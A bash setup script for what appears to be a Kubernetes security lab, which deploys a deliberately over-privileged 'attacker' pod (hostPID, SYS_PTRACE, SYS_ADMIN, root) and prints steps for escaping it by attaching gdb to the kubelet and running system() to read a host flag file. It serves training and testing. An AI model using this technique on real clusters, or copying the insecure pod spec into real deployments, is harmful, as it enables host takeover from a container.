#!/bin/bash
set -euo pipefail
K8S_ID="k8s-19"
CLUSTER_NAME="cve-k8s-19-ptrace"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

k8s_init
k8s_create_cluster
k8s_create_host_flag
k8s_wait_ready
k8s_apply << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: ptrace-pod
spec:
  hostPID: true
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sleep", "3600"]
      securityContext:
        capabilities:
          add:
            - SYS_PTRACE
            - SYS_ADMIN
        runAsUser: 0
      volumeMounts:
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

k8s_wait_pod "ptrace-pod"

echo "[*] Installing gdb in the pod..."
kubectl exec ptrace-pod -- bash -c "apt-get update -qq && apt-get install -y -qq gdb 2>/dev/null" 2>/dev/null || \
  echo "  gdb install in progress (may take a moment)..."

k8s_info
echo "    Exploitation steps:"
echo "    1. kubectl exec -it ptrace-pod -- bash"
echo "    2. apt-get update && apt-get install -y gdb  (if not already installed)"
echo "    3. ps aux | grep kubelet  (find kubelet PID)"
echo "    4. gdb -p <KUBELET_PID>"
echo "    5. In gdb: call (int)system(\"cat /host-flag/flag.txt > /tmp/flag.txt\")"
echo "    6. cat /tmp/flag.txt"
